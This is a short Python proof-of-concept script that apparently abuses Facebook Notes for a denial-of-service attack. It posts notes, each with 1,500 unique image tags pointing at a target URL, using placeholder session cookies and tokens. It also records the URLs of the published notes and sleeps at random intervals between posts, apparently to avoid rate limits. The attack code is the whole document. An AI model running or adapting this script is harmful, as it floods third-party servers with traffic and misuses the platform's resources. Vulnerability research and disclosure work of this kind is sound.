import urllib
import subprocess
import re
import time
import random


"""
Rough proof of concept, probably needs much improvement.
Fill the fill-mes. 
"""

url = "https://m.facebook.com/a/note.php?publish&gfid=fill-me&refid=23"

cookie = "datr=fill-me; lu=fill-me; fr=fill-me; locale=en_US; ...fill-me...."

postvar = "fb_dtsg=fill-me&charset_test=fill-me&audience_fbid=fill-me"


target = "http://targetIP/a.pdf"
title = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

url_list = {}

f = open("notes.txt","w")    
f.write("")
f.close()

for it in range(0,4):
    for r in title:
        t = str(it) + r
        i = 0
        output = ""
        postmsg = postvar
        while i < 1500:
            #add random params to make it unique
            output += "<img src=" + target + "?r" + t + "="+str(i)+"></img>\n"
            i = i + 1
            
        body = urllib.quote_plus(output)
        postmsg += "&title=" + urllib.quote_plus(t) + "&body=" + body

        f = open("post.txt","w")
        f.write(postmsg)
        f.close()
         
        proc = subprocess.Popen(['curl','--insecure','--user-agent','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2','--cookie',cookie,'--data','@post.txt','--location','-s',url],shell=False, stdout=subprocess.PIPE)
        page = proc.communicate()[0]
      
        pattern = "<span>" + t + "</span>"
        m = re.findall(r'<div class="acw apm abt"><a href="(.*?)">'+pattern,page,re.DOTALL | re.IGNORECASE)
        for d in m:
            u = "https://www.facebook.com" + d
            url_list[u] = 1
            f = open("notes.txt","a")    
            f.write(u+"\n")
            f.close()
            break
     
        sec = random.randint(5,10)
        time.sleep(sec)
        print t






